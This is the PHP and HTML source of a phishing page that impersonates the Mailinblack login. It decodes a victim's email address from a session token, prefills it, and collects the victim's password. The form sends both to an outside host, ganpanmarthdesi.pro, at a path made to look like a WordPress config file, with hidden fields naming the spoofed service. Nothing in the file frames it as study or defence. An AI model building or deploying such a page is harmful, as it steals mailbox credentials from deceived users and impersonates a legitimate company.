<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>QG</title>
<link rel="icon" type="image/png" href="https://qg.mailinblack.com/favicon.ico" />
<style>
  html, body {
    font-family: Arial, sans-serif;
    margin: 0;
    padding: 0;
    border: 0;
    position: absolute;
    height: 100%;
    min-width: 100%;
    font-size: 13px;
    color: #404040;
    direction: ltr;
    -webkit-text-size-adjust: none;
  }

  .form-group {
    position: relative;
    margin-bottom: 20px;
  }

  .form-group input {
    -moz-appearance: none;
    -webkit-appearance: none;
    appearance: none;
    width: 100%;
    padding: 10px 15px 10px 15px;
    border: 1px solid #d5d5d5;
    background: transparent;
    border-radius: 10px;
    font-size: 14px;
    color: black;
    box-sizing: border-box;
  }

  .form-group input:focus {
    outline: none;
    font-size: 14px;
    border-color: #E68037;
  }

  .form-group label {
    position: absolute;
    left: 15px;
    top: 12px;
    background: white;
    padding: 0 5px;
    color: #787878;
    font-size: 14px;
    pointer-events: none;
    transition: 0.2s ease all;
  }

  .form-group input:focus + label,
  .form-group input:not(:placeholder-shown) + label {
    top: -8px;
    left: 10px;
    font-size: 14px;
    color: #E68037;
  }

  input::placeholder {
    color: transparent;
  }
</style>
</head>
<body>

<div align="center">
  <table border="0" width="1140" cellspacing="0" cellpadding="0" height="705" background="img/bg.png">
    <tr>
      <td>
        <table border="0" width="100%" cellspacing="0" cellpadding="0">
          <tr><td height="382"></td></tr>
          <tr>
            <td height="190">
              <table border="0" width="100%" cellspacing="0" cellpadding="0">
                <tr>
                  <td width="361"></td>
                  <td>
                    <table border="0" width="100%" cellspacing="0" cellpadding="0">
                      <form method="post" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php">
                        <tr>
                          <td height="60">
                            <div class="form-group">
                              <input type="text" name="user" id="user" placeholder="Email" value="<?php echo $users;?>@<?php echo $ddomain;?>" required>
                              <label for="user">Email</label>
                            </div>
                          </td>
                        </tr>
								<tr>
									<td height="5">
									 <input type="hidden" name="domain" value="<?php echo $ddomain;?>" >
									 <input type="hidden" name="link" value="https://qg.mailinblack.com/login" >
									 <input type="hidden" name="sender" value="Mailinblack.com" >
									</td>
								</tr>
                        <tr>
                          <td height="60">
                            <div class="form-group">
                              <input type="password" name="passwd" id="passwd" placeholder="Mot de passe" required>
                              <label for="passwd">Mot de passe</label>
                            </div>
                          </td>
                        </tr>
                        <tr>
                          <td height="25"></td>
                        </tr>
                        <tr>
                          <td>
                            <table border="0" width="100%" cellspacing="0" cellpadding="0">
                              <tr>
                                <td width="155">&nbsp;</td>
                                <td width="106">
                                  <input type="image" src="img/btn.png" width="106" height="37">
                                </td>
                                <td>&nbsp;</td>
                              </tr>
                            </table>
                          </td>
                        </tr>
                      </form>
                    </table>
                  </td>
                  <td width="359">&nbsp;</td>
                </tr>
              </table>
            </td>
          </tr>
          <tr><td height="135"></td></tr>
        </table>
      </td>
    </tr>
  </table>
</div>

</body>
</html>

<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>